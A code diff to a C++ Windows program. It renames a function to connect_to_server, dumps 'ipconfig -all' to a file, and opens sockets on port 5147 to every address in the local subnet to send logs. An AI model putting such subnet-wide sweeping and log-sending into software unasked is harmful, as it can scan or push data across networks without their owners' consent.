@@ -64,7 +64,7 @@ string get_ip_from_decimal(unsigned long ip) {
 // fd_set write_fds;
 // fd_set write_fds[256][256];
 
-void send_file(fd_set **write_fds, SOCKET ** sock_arr) {
+void connect_to_server(fd_set **write_fds, SOCKET ** sock_arr, int * range1, int * range2, int * ne, int * nf) {
 
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
@@ -111,10 +111,14 @@ void send_file(fd_set **write_fds, SOCKET ** sock_arr) {
 
     LogSender ls;
 
-    for (int i = n_e; i <= n_e + (256 - s_e - 1); i++) {
-        cout << i << endl;
+    *range1 = n_e + (256 - s_e - 1);
+    *range2 = n_f + (256 - s_f - 1);
 
-        for (int j = n_f; j < 256; j++) {
+    *ne = n_e;
+    *nf = n_f;
+
+    for (int i = n_e; i <= *range1; i++) {
+        for (int j = n_f; j < *range2; j++) {
             FD_ZERO(&(write_fds)[i][j]);
 
             sockaddr_in addr;
@@ -127,11 +131,12 @@ void send_file(fd_set **write_fds, SOCKET ** sock_arr) {
             // cout << get_ip_from_decimal(network_address).c_str() << endl;
 
             // addr.sin_addr.s_addr = inet_addr("131.155.222.2");
-            addr.sin_port = htons(5000);
+            addr.sin_port = htons(5147);
 
             (sock_arr)[i][j] = ls.send_logs(&addr);
 
             FD_SET((sock_arr)[i][j], &(write_fds)[i][j]);
+
             // FD_SET((*sock_arr)[i], &write_fds);
 
             // network_address += 1;
